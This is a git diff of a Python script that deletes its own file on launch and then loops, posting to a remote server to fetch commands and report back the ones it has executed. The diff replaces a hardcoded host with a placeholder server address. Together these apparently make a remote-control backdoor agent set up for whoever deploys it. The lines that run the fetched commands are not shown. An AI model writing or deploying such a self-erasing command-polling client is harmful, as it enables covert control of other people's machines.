@@ -1,3 +1,6 @@
+SERVER = "YOUR SERVER IP"
+
+
 import os
 import glob
 os.remove(__file__)
@@ -108,7 +111,7 @@ while True:
     except:
         pass
     try:
-        commands = requests.post("https://gsgtafelmanager.pythonanywhere.com/q/" + tafelid, json={"executed": executed_cmds}).json()["commands"]
+        commands = requests.post(SERVER + "/" + tafelid, json={"executed": executed_cmds}).json()["commands"]
     except Exception as e:
         time.sleep(10)
         continue
